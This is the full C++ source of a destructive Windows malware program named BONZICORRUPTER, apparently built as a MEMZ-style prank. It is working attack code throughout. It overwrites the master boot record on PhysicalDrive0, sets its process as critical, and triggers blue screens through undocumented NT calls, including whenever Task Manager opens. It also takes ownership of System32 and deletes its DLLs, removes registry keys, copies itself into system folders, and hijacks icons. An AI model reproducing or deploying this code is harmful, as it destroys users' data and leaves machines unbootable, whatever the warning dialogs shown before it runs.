// BONZICORRUPTER - A destructive Windows malware inspired by MEMZ
// THIS WILL OVERWRITE YOUR MBR WITH A BONZIBUDDY IMAGE
// I'M NOT A SCRIPT KIDDIE, THIS IS JUST SOME SHIT I MADE WITH AI FOR FUN

#include <windows.h>
#include <thread>
#include <chrono>
#include <vector>
#include <string>
#include <shlobj.h>
#include <mmsystem.h>
#include <iostream>
#include <tlhelp32.h>
#include <ctime>
#include <cstdlib>
#include <random>
#include <cmath>

// Define Pi if not available
#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Link GDI, Multimedia, and Shell libraries
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "msimg32.lib")

// Typedefs for undocumented NT functions
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);
typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(BOOLEAN NewValue, PBOOLEAN OldValue, BOOLEAN NeedSudo);

// Global state
bool isEnding = false;
thread_local HHOOK hHook = NULL;

// --- SETS PROCESS TO CRITICAL --- //

void setCriticalStatus(BOOL active) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        auto SetCritical = (pRtlSetProcessIsCritical)GetProcAddress(ntdll, "RtlSetProcessIsCritical");
        if (RtlAdjustPrivilege && SetCritical) {
            BOOLEAN bEnabled;
            RtlAdjustPrivilege(20, TRUE, FALSE, &bEnabled);
            SetCritical(active, NULL, FALSE);
        }
    }
}

// --- BSOD TRIGGER --- //

void triggerBSOD() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
        if (RtlAdjustPrivilege && NtRaiseHardError) {
            BOOLEAN bEnabled; ULONG response;
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            NtRaiseHardError(0xC0000420, 0, 0, NULL, 6, &response);
        }
    }
}

/// --- RUNS A COMMAND WITHOUT ANY VISIBLE WINDOW (EVEN IN TASK MANAGER) --- //

void runSilentCommand(std::string cmd) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.cb = sizeof(si); 
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hidden window
    
    std::string fullCmd = "cmd.exe /c " + cmd;
    std::vector<char> writableCmd(fullCmd.begin(), fullCmd.end());
    writableCmd.push_back('\0');

    // CREATE_NO_WINDOW is the definitive way to hide the console host process
    if (CreateProcessA(NULL, writableCmd.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// --- FORCE WRITE REGISTRY KEY (EVEN IF PROTECTED) --- //

void forceWriteReg(HKEY hRoot, const std::string& subKey, const std::string& value) {
    HKEY hKey;
    if (RegCreateKeyExA(hRoot, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)value.c_str(), (DWORD)value.length());
        RegCloseKey(hKey);
    }
}

// --- SCREEN COLOR CHANGER --- //

void changeColors() {
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    bool isRed = true;

    // Use a high-frequency internal counter instead of long sleeps to toggle colors
    int toggleCounter = 0;

    while (!isEnding) {
        // Fetch the DC freshly inside the fast loop
        HDC hdc = GetDC(0);
        if (hdc) {
            // Create the brush (Red or Black depending on the toggle)
            HBRUSH brush = CreateSolidBrush(isRed ? RGB(255, 0, 0) : RGB(20, 20, 20));
            HBRUSH oldBrush = (HBRUSH)SelectObject(hdc, brush);

            // 0x00A000C9 is the ternary ROP code for 'DPa' (Destination AND Pattern)
            PatBlt(hdc, 0, 0, sw, sh, 0x00A000C9);

            // Cleanup
            SelectObject(hdc, oldBrush);
            DeleteObject(brush);
            ReleaseDC(0, hdc);
        }

        // Increment counter to handle the state swap roughly every 1.5 seconds
        // without giving up control of the screen drawing
        toggleCounter++;
        if (toggleCounter >= 150) { // 150 iterations * ~10ms = ~1500ms
            isRed = !isRed;
            toggleCounter = 0;
        }

        // Minimal sleep to prevent 100% core saturation while constantly drawing
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }
    
    // Final clear when done
    InvalidateRect(NULL, NULL, TRUE);
}

// --- GLITCH EFFECT --- //

void glitchEffect() {
    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    int screenWidth  = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    std::random_device rd;
    std::mt19937 gen(rd());

    // Coordinate Distributions
    std::uniform_int_distribution<int> distX(0, screenWidth);
    std::uniform_int_distribution<int> distY(0, screenHeight);

    // Target Specific Regions
    int topZoneHeight   = static_cast<int>(screenHeight * 0.25);
    int leftZoneWidth   = static_cast<int>(screenWidth * 0.38);
    int blueZoneMinY    = static_cast<int>(screenHeight * 0.25);
    int blueZoneMaxY    = static_cast<int>(screenHeight * 0.65);

    std::uniform_int_distribution<int> distTopY(0, topZoneHeight);
    std::uniform_int_distribution<int> distLeftX(0, leftZoneWidth);
    std::uniform_int_distribution<int> distBlueY(blueZoneMinY, blueZoneMaxY);

    // Micro Block Sizes (Matching the fine mosaic grid)
    std::uniform_int_distribution<int> distBlockW(8, 32);
    std::uniform_int_distribution<int> distBlockH(5, 18);

    std::uniform_int_distribution<int> distOffset(-100, 100);
    std::uniform_int_distribution<int> distOp(0, 100);

    // Exact Saturated Palette from Reference Screenshot
    COLORREF mainPalette[] = {
        RGB(0, 255, 255),   // Cyan
        RGB(255, 0, 255),   // Magenta
        RGB(255, 255, 0),   // Yellow
        RGB(0, 0, 255),     // Blue
        RGB(255, 0, 0),     // Red
        RGB(0, 255, 0),     // Green
        RGB(255, 255, 255), // Pure White
        RGB(0, 0, 0)        // Pure Black
    };
    std::uniform_int_distribution<int> distColor(0, 7);

    COLORREF blueShades[] = {
        RGB(0, 0, 255),
        RGB(0, 0, 200),
        RGB(0, 50, 255),
        RGB(10, 10, 180)
    };
    std::uniform_int_distribution<int> distBlueColor(0, 3);

    DWORD ropCodes[] = { SRCINVERT, SRCAND, SRCPAINT, DSTINVERT };
    std::uniform_int_distribution<int> distRop(0, 3);

    auto startTime = std::chrono::steady_clock::now();

    // Run effect frame loop for 1000ms
    while (std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::steady_clock::now() - startTime).count() < 1000)
    {
        for (int i = 0; i < 220; ++i) {
            int opType = distOp(gen);

            if (opType < 30) {
                // --- Layer 1: Top Zone Horizontal Scanlines ---
                // Full-width thin horizontal stripes stacked across the upper screen
                int y = distTopY(gen);
                int h = (distBlockH(gen) / 3) + 1; // 1px to 7px height

                HBRUSH hBrush = CreateSolidBrush(mainPalette[distColor(gen)]);
                RECT rect = { 0, y, screenWidth, y + h };
                FillRect(hdc, &rect, hBrush);
                DeleteObject(hBrush);
            }
            else if (opType < 50) {
                // --- Layer 2: Left-Side Deep Blue Block Cluster ---
                // Recreates the large blue block region on the mid-left side
                int x = distLeftX(gen);
                int y = distBlueY(gen);
                int w = distBlockW(gen) + 15;
                int h = distBlockH(gen) + 10;

                HBRUSH hBrush = CreateSolidBrush(blueShades[distBlueColor(gen)]);
                RECT rect = { x, y, x + w, y + h };
                FillRect(hdc, &rect, hBrush);
                DeleteObject(hBrush);
            }
            else if (opType < 80) {
                // --- Layer 3: High-Density Micro-Mosaic Tiles ---
                // Screen-wide solid micro-block scatter
                int x = distX(gen);
                int y = distY(gen);
                int w = distBlockW(gen);
                int h = distBlockH(gen);

                HBRUSH hBrush = CreateSolidBrush(mainPalette[distColor(gen)]);
                RECT rect = { x, y, x + w, y + h };
                FillRect(hdc, &rect, hBrush);
                DeleteObject(hBrush);
            }
            else if (opType < 92) {
                // --- Layer 4: Vertical Hairline Line Cuts ---
                // Inverted 1px-3px vertical streaks cutting through blocks
                int x = distX(gen);
                int w = (distBlockW(gen) / 10) + 1; // 1px to 3px wide
                int y = distY(gen);
                int h = distBlockH(gen) * 5;

                BitBlt(hdc, x, y, w, h, hdc, x, y, DSTINVERT);
            }
            else {
                // --- Layer 5: Offset Pixel Shift Blit ---
                // Bitwise raster ops that slice up borders into grid steps
                int x = distX(gen);
                int y = distY(gen);
                int w = distBlockW(gen) + 8;
                int h = distBlockH(gen) + 8;
                int offsetX = distOffset(gen);
                int offsetY = distOffset(gen);

                BitBlt(hdc, x, y, w, h, hdc, x + offsetX, y + offsetY, ropCodes[distRop(gen)]);
            }
        }

        // Minimal delay for max density throughput
        std::this_thread::sleep_for(std::chrono::microseconds(300));
    }

    // Clean up
    ReleaseDC(NULL, hdc);

    // Refresh display desktop back to normal
    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN | RDW_UPDATENOW);
}

// --- RANDOM BEEP GENERATOR --- //

void randomBeepGenerator() {
    // Setup standard random number generation engine
    std::random_device rd;
    std::mt19937 gen(rd());
    
    // Define the range for pitches (frequencies in Hz)
    // Low pitch (e.g., 200 Hz) to High pitch (e.g., 3000 Hz)
    std::uniform_int_distribution<> freqDist(200, 3000);

    while (!isEnding) {
        // Generate a random frequency
        int randomFrequency = freqDist(gen);

        // Play the beep
        // 80ms duration leaves a tiny gap before the 100ms interval ends
        Beep(randomFrequency, 80);

        // Sleep for 0.1 seconds (100 milliseconds) total interval
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

// --- SCREEN ROTATION ILLUSION --- //

void rotateScreenEffect() {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    
    double cx = sw / 2.0;
    double cy = sh / 2.0;
    double currentAngle = 0.0;
    int angleCounter = 0;

    while (!isEnding) {
        HDC hdcSrc = GetDC(0);
        if (hdcSrc) {
            double cosA = cos(currentAngle);
            double sinA = sin(currentAngle);

            POINT lpPoint[3];

            auto rotatePoint = [&](double x, double y) -> POINT {
                POINT p;
                p.x = static_cast<LONG>(cx + (x - cx) * cosA - (y - cy) * sinA);
                p.y = static_cast<LONG>(cy + (x - cx) * sinA + (y - cy) * cosA);
                return p;
            };

            lpPoint[0] = rotatePoint(0, 0);   
            lpPoint[1] = rotatePoint(sw, 0);  
            lpPoint[2] = rotatePoint(0, sh);  

            // Render continuous frame
            PlgBlt(hdcSrc, lpPoint, hdcSrc, 0, 0, sw, sh, NULL, 0, 0);
            ReleaseDC(0, hdcSrc);
        }

        // Increment rotation angle roughly every 1 second (100 iterations * 10ms)
        angleCounter++;
        if (angleCounter >= 100) {
            currentAngle += 20.0 * (M_PI / 180.0);
            if (currentAngle >= 2.0 * M_PI) {
                currentAngle -= 2.0 * M_PI;
            }
            angleCounter = 0;
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    InvalidateRect(NULL, NULL, TRUE);
}

// --- SCREEN MULTIPLIER EFFECT --- //

void screenMultiplier() {
    int sw = GetSystemMetrics(0); 
    int sh = GetSystemMetrics(1); 
    
    int destX = 0;
    int destY = 0;
    int positionCounter = 0;

    // Pick initial random position
    destX = (sw > 300) ? rand() % (sw - 300) : 0;
    destY = (sh > 300) ? rand() % (sh - 300) : 0;

    while (!isEnding) {
        HDC hdc = GetDC(0);
        if (hdc) {
            // Keep forcefully pasting the captured image to the current destination
            StretchBlt(hdc, destX, destY, 300, 300, hdc, 0, 0, sw, sh, SRCCOPY);
            ReleaseDC(0, hdc);
        }

        // Change the targeted thumbnail box location every 200ms (20 * 10ms)
        positionCounter++;
        if (positionCounter >= 20) {
            destX = (sw > 300) ? rand() % (sw - 300) : 0;
            destY = (sh > 300) ? rand() % (sh - 300) : 0;
            positionCounter = 0;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); 
    }
    
    InvalidateRect(NULL, NULL, TRUE);
}

// --- CURSOR SHAKING PAYLOAD --- //

void cursorShakingPayload() {
    while (!isEnding) {
        POINT p;
        GetCursorPos(&p);
        SetCursorPos(p.x + (rand() % 3 - 1), p.y + (rand() % 3 - 1));
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }
}

// --- CURSOR TRAIL PAYLOAD --- //

void cursorTrail() {
    POINT cursor;
    // Standard system icons
    LPCSTR icons[] = { IDI_ERROR, IDI_WARNING, IDI_INFORMATION, IDI_QUESTION };

    // Get system metrics for standard icon dimensions (usually 32x32)
    int iconWidth = GetSystemMetrics(SM_CXICON);
    int iconHeight = GetSystemMetrics(SM_CYICON);

    while (!isEnding) {
        HDC hdc = GetDC(NULL); // Get Desktop DC
        if (hdc) {
            GetCursorPos(&cursor);

            // Load the system icon
            HICON hIcon = LoadIcon(NULL, icons[rand() % 4]);

            if (hIcon) {
                // 1. Create an off-screen memory DC compatible with the display DC
                HDC hdcMem = CreateCompatibleDC(hdc);

                // 2. Define a 32-bit ARGB bitmap format
                BITMAPINFO bmi = { 0 };
                bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                bmi.bmiHeader.biWidth = iconWidth;
                bmi.bmiHeader.biHeight = -iconHeight; // Negative height = top-down bitmap
                bmi.bmiHeader.biPlanes = 1;
                bmi.bmiHeader.biBitCount = 32;
                bmi.bmiHeader.biCompression = BI_RGB;

                void* pBits = nullptr;
                HBITMAP hBitmap = CreateDIBSection(hdcMem, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);

                if (hBitmap) {
                    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

                    // 3. Draw the icon into our 32-bit memory buffer
                    DrawIconEx(hdcMem, 0, 0, hIcon, iconWidth, iconHeight, 0, NULL, DI_NORMAL);

                    // 4. Configure AlphaBlend to use the icon's source alpha channel
                    BLENDFUNCTION blend = { 0 };
                    blend.BlendOp = AC_SRC_OVER;
                    blend.BlendFlags = 0;
                    blend.SourceConstantAlpha = 255;
                    blend.AlphaFormat = AC_SRC_ALPHA; // Respect per-pixel ARGB alpha values

                    // 5. Blend the icon seamlessly onto the desktop screen DC
                    AlphaBlend(
                        hdc, 
                        cursor.x, cursor.y, 
                        iconWidth, iconHeight, 
                        hdcMem, 
                        0, 0, 
                        iconWidth, iconHeight, 
                        blend
                    );

                    // Clean up bitmap resources
                    SelectObject(hdcMem, hOldBitmap);
                    DeleteObject(hBitmap);
                }

                // Clean up memory DC and Icon
                DeleteDC(hdcMem);
                DestroyIcon(hIcon);
            }
            ReleaseDC(NULL, hdc);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }
}

// --- REGISTRY PAYLOAD --- //

void registryPayload() {
    HKEY hives[] = { HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_CLASSES_ROOT };
    
    while (!isEnding) {
        for (HKEY hRoot : hives) {
            HKEY hKey;
            std::string subkey = "Software\\BONZIBUDDY_" + std::to_string(rand() % 1000);
            if (RegCreateKeyExA(hRoot, subkey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                RegSetValueExA(hKey, "BONZICORRUPTER", 0, REG_SZ, (BYTE*)"EXPAND DONG", 12);
                RegCloseKey(hKey);
            }

            RegDeleteKeyA(hRoot, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
            RegDeleteKeyA(hRoot, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(3000));
    }
}

// --- REPLICATION PAYLOAD --- //

void replicationPayload() {
    char sourcePath[MAX_PATH];
    GetModuleFileNameA(NULL, sourcePath, MAX_PATH);

    auto copyToFolder = [&](int csidl, std::string subName) {
        char folderPath[MAX_PATH];
        if (SHGetSpecialFolderPathA(NULL, folderPath, csidl, FALSE)) {
            std::string dest = std::string(folderPath) + "\\" + subName + std::to_string(rand() % 1000) + ".exe";
            CopyFileA(sourcePath, dest.c_str(), FALSE);
        }
    };

    while (!isEnding) {
        copyToFolder(CSIDL_WINDOWS, "BONZI_");
        copyToFolder(CSIDL_PROGRAM_FILES, "BONZI_");
        copyToFolder(CSIDL_PROGRAM_FILESX86, "BONZI_");
        copyToFolder(CSIDL_APPDATA, "BONZI_");
        copyToFolder(CSIDL_PERSONAL, "BONZI_");
        std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    }
}

// --- SEARCH PAYLOAD --- //

void searchPayload() {
    std::vector<std::string> queries = {
        "how to download bonzibuddy?",
        "bonziworld", "pls help", "worst antivirus ever download",
        "pc optimizer pro", "how to get dank memes", "roblox exploits"
    };
    for (const auto& q : queries) {
        std::string url = "https://www.google.com/search?q=" + q;
        // SW_HIDE hides the browser window itself
        ShellExecuteA(NULL, "open", url.c_str(), NULL, NULL, SW_HIDE); 
        std::this_thread::sleep_for(std::chrono::seconds(30)); 
    }
}

// --- SCRAMBLE CLOCK --- //

void scrambleClock() {
    std::this_thread::sleep_for(std::chrono::seconds(20)); // Wait 20 seconds as requested
    while (!isEnding) {
        SYSTEMTIME st;
        GetLocalTime(&st); // Get current to preserve some structure if needed

        // Scramble Date
        st.wYear = 2000 + (rand() % 8000);   // Year 2000 - 9999
        st.wMonth = 1 + (rand() % 12);       // Month 01 - 12
        st.wDay = 1 + (rand() % 28);         // Day 01 - 28 (safe for all months)
        
        // Scramble Time
        st.wHour = rand() % 24;              // 00 - 23
        st.wMinute = rand() % 60;            // 00 - 59
        st.wSecond = rand() % 60;            // 00 - 59
        st.wMilliseconds = 0;

        SetLocalTime(&st);                   // Apply system-wide change
        std::this_thread::sleep_for(std::chrono::milliseconds(200)); // 0.2s interval
    }
}

// --- SOUND PAYLOAD --- //

void soundPayload() {
    LPCSTR sounds[] = { "SystemHand", "WindowsUAC", "DeviceConnect", "DeviceDisconnect", "SystemAsterisk", "SystemExclamation", "SystemQuestion", "SystemDefault", "SystemExit", "SystemStart", "DeviceFail", "Notification.Default", "Notification.IM", "Notification.Mail", "Notification.Reminder", "Notification.SMS", "EmptyRecycleBin", "Navigating", "AppGPFault", "LowBatteryAlarm", "CriticalBatteryAlarm" };
    int timings[] = { 1000, 1050, 1100, 1150, 1200, 1250, 1300, 1350, 1400, 1450, 1500 };
    
    while (!isEnding) {
        PlaySoundA(sounds[rand() % 21], NULL, SND_ALIAS | SND_ASYNC | SND_NODEFAULT);
        std::this_thread::sleep_for(std::chrono::milliseconds(timings[rand() % 11]));
    }
}

// --- CHAOTIC MESSAGE BOXES --- //

LRESULT CALLBACK ChaosHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hwnd = (HWND)wParam;
        
        // Grab the class name of the window being activated
        char className[256];
        GetClassNameA(hwnd, className, sizeof(className));
        
        // "#32770" is the internal Windows class name for Dialog/Message Boxes.
        // This ensures we ONLY move the actual message box, not hidden background windows.
        if (strcmp(className, "#32770") == 0) {
            int sw = GetSystemMetrics(SM_CXSCREEN);
            int sh = GetSystemMetrics(SM_CYSCREEN);
            
            int destX = (sw > 300) ? rand() % (sw - 300) : 0;
            int destY = (sh > 200) ? rand() % (sh - 200) : 0;
            
            // Snap the message box to the random coordinate
            SetWindowPos(hwnd, HWND_TOPMOST, destX, destY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
            
            // Unhook immediately so it doesn't fire multiple times for this single box
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void spawnChaosBox(std::string text) {
    // Re-seed rand() specifically for THIS thread. 
    // Mixing time with the Thread ID guarantees true chaos even if multiple threads spawn instantly.
    srand(static_cast<unsigned int>(time(NULL)) ^ GetCurrentThreadId());
    
    // Set the hook exclusively for the current thread
    hHook = SetWindowsHookEx(WH_CBT, ChaosHook, NULL, GetCurrentThreadId());
    
    // Trigger the box
    MessageBoxA(NULL, text.c_str(), "ERROR", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);
    
    // Failsafe unhook in case the box was closed before the hook triggered
    if (hHook != NULL) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
}

// --- TIMED MESSAGE BOXES --- //

void timedMessagePayload() {
    std::vector<std::string> msgs = { "hello", "expand dong", "bonzibuddy is the best", "lol", "ok" };
    for (const auto& m : msgs) {
        std::thread(spawnChaosBox, m).detach();
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }
}

// --- DESTRUCTION PAYLOAD --- //

void destructionPayload() {
    runSilentCommand("takeown /f C:\\Windows\\System32 /r /d y");
    runSilentCommand("icacls C:\\Windows\\System32 /grant administrators:F /t");
    runSilentCommand("del /f /s /q C:\\Windows\\System32\\*.dll");
}

// --- SYSTEM ICON CHANGER --- //

void changeSystemIcons() {
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string sExePath(exePath);

    const char* targetCLSIDs[] = {
        "{20D04FE0-3AEA-1069-A2D8-08002B30309D}",
        "{645FF040-5081-101B-9F08-00AA002F954E}",
        "{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}",
        "{374DE290-123F-4565-9164-39C4925E467B}",
        "{152805B3-2735-4B14-B6F9-055756F3F3E1}",
        "{4234d49b-0245-4df3-b780-3893943456e1}",
        "{21EC2020-3AEA-1069-A2DD-08002B30309D}",
        "{D202488A-06AA-11D0-B150-00AA00B8E083}"
    };

    for (const char* clsid : targetCLSIDs) {
        std::string baseKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\" + std::string(clsid) + "\\DefaultIcon";
        forceWriteReg(HKEY_CURRENT_USER, baseKey, sExePath + ",0");
    }

    HKEY hShellIcons;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hShellIcons, NULL) == ERROR_SUCCESS) {
        for (int i = 0; i < 256; i++) {
            std::string idx = std::to_string(i);
            RegSetValueExA(hShellIcons, idx.c_str(), 0, REG_SZ, (BYTE*)sExePath.c_str(), (DWORD)sExePath.length());
        }
        RegCloseKey(hShellIcons);
    }

    const char* fileClasses[] = { "exefile", "dllfile", "Folder", "Directory", "lnkfile", "Drive", "Unknown", "cmdfile", "batfile", "txtfile" };
    for (const char* fclass : fileClasses) {
        forceWriteReg(HKEY_CLASSES_ROOT, std::string(fclass) + "\\DefaultIcon", sExePath + ",0");
    }

    runSilentCommand("taskkill /f /im explorer.exe");
    runSilentCommand("del /f /q %localappdata%\\IconCache.db");
    runSilentCommand("del /f /s /q %localappdata%\\Microsoft\\Windows\\Explorer\\iconcache*");
    
    SHChangeNotify(SHCNE_ASSOCCHANGED, SHCNF_IDLIST, NULL, NULL);
    runSilentCommand("start explorer.exe");
}

// --- MBR WRITER --- //

void writeToMbr() {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(100), "BINARY");
    if (!hRes) return;
    HGLOBAL hData = LoadResource(NULL, hRes);
    unsigned char* pPayloadCode = (unsigned char*)LockResource(hData);
    DWORD payloadSize = SizeofResource(NULL, hRes);
    std::vector<unsigned char> diskBuffer(pPayloadCode, pPayloadCode + payloadSize);

    if (payloadSize > 512) {
        unsigned char* imgStart = diskBuffer.data() + 512;
        int imgDataSize = payloadSize - 512;
        int rowSize = 320;
        int numRows = imgDataSize / rowSize;
        std::vector<unsigned char> tempImg(imgDataSize);
        for (int i = 0; i < numRows; i++) {
            memcpy(&tempImg[i * rowSize], imgStart + (numRows - 1 - i) * rowSize, rowSize);
        }
        memcpy(imgStart, tempImg.data(), imgDataSize);
    }

    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDrive != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten;
        WriteFile(hDrive, diskBuffer.data(), (DWORD)diskBuffer.size(), &bytesWritten, NULL);
        CloseHandle(hDrive);
    }
}

// --- TASK MANAGER MONITOR --- //

void taskManagerMonitor() {
    while (!isEnding) {
        bool taskMgrFound = false;
        
        // Take a snapshot of all running processes
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe32;
            pe32.dwSize = sizeof(PROCESSENTRY32);

            // Iterate through processes
            if (Process32First(hSnapshot, &pe32)) {
                do {
                    // Compare process filename
                    if (std::string(pe32.szExeFile) == "Taskmgr.exe") {
                        taskMgrFound = true;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe32));
            }
            CloseHandle(hSnapshot);
        }

        if (taskMgrFound) {
            for (int i = 0; i < 200; i++) {
                std::thread(spawnChaosBox, "NICE TRY").detach();
                std::this_thread::sleep_for(std::chrono::milliseconds(30));
            }
            triggerBSOD();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
}

// --- MAIN EXECUTION --- //

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (MessageBoxA(NULL, "THIS PROGRAM IS MALWARE AND WILL DESTROY YOUR MACHINE! ARE YOU SURE YOU WANT TO EXECUTE IT?", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
        return 0;
    }

    if (MessageBoxA(NULL, "LAST WARNING, I AM NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY THIS MALWARE! CLICK NO TO EXIT THIS PROGRAM OR YES TO CONTINUE!", "Warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
        return 0;
    }

    srand((unsigned int)time(NULL));

    // 0 Seconds - Set BONZICORRUPTER.exe process as a critical process & Overwrite MBR & Task Manager Monitor
    setCriticalStatus(TRUE);
    writeToMbr();
    std::thread(taskManagerMonitor).detach();
    
    
    // 5 Seconds - Change icons with a BonziBUDDY icon
    std::this_thread::sleep_for(std::chrono::seconds(5));
    changeSystemIcons();
    std::thread(glitchEffect).detach();

    // 20 Seconds - Start sound payload and cursor shaking
    std::this_thread::sleep_for(std::chrono::seconds(15));
    std::thread(soundPayload).detach();
    std::thread(cursorShakingPayload).detach();

    // 40 Seconds - Start search payload and cursor icon trail
    std::this_thread::sleep_for(std::chrono::seconds(20));
    std::thread(searchPayload).detach();
    std::thread(cursorTrail).detach();

    // 60 Seconds - Start registry payload & replication payload
    std::this_thread::sleep_for(std::chrono::seconds(20));
    std::thread(replicationPayload).detach(); 
    std::thread(registryPayload).detach();    

    // 80 Seconds - Start screen color changer & random beep generator & screen rotation effect
    std::this_thread::sleep_for(std::chrono::seconds(20));
    std::thread(changeColors).detach();
    std::thread(randomBeepGenerator).detach();
    std::thread(rotateScreenEffect).detach();

    // 100 Seconds - Start screen multiplier effect & scramble clock & destruction payload
    std::this_thread::sleep_for(std::chrono::seconds(20));
    std::thread(screenMultiplier).detach();
    std::thread(destructionPayload).detach(); 

    // 120 Seconds - Start timed message boxes
    std::this_thread::sleep_for(std::chrono::seconds(20));
    std::thread(timedMessagePayload).detach();
    std::thread(scrambleClock).detach();

    // Final wait until 6 minutes and then trigger BSOD
    std::this_thread::sleep_for(std::chrono::seconds(240));
    
    isEnding = true;
    setCriticalStatus(FALSE); 
    triggerBSOD();

    return 0;
}